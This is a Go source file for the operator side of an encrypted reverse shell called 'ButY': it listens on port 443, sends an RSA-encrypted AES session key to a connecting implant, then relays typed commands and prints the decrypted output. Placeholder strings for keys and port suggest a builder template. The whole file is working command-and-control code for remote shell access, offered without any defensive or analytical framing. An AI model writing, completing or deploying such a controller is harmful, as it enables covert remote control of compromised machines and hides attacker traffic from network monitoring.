package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

//const LOCALPORT = ":REVPRT"
const LOCALPORT = ":443"

var PRIVATEKEY = []byte(`BUTYMNGRPVTKEY`)
var SHELLPUBLICKEY = []byte(`BUTYCLIENTPUBKEY`)

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	var recvdcmd [512]byte
	cyanc.Println("RSA Tunnell...")
	listner, _ := net.Listen("tcp", LOCALPORT)
	conn, _ := listner.Accept()
	keyval := generateKey()
	encmsg, _ := encryptMessage([]byte(keyval))
	//fmt.Println(keyval)
	conn.Write(encmsg)
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print("[[ButY]]")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, "bye") == 0 {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			conn.Close()
			os.Exit(1)
		} else {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			alldata := make([]byte, 0, 4096) // big buffer

			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				if chunkbytes < 512 {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)
					break
				} else {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)

				}
			}

			greenc.Println(decryptconnection(keyval, string(alldata)))

		}

	}

}

func encryptconnection(keyval, texttoencrypt string) string {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}
func generateKey() string {
	mathrand.Seed(time.Now().UnixNano())
	var keychars = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~@#$%^&*()-_=+;:?")
	randomkey := make([]rune, 32)
	for i := range randomkey {
		randomkey[i] = keychars[mathrand.Intn(len(keychars))]
	}
	return string(randomkey)
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(SHELLPUBLICKEY)
	if block == nil {
		return nil, errors.New("public key error")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New("private key error!")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}
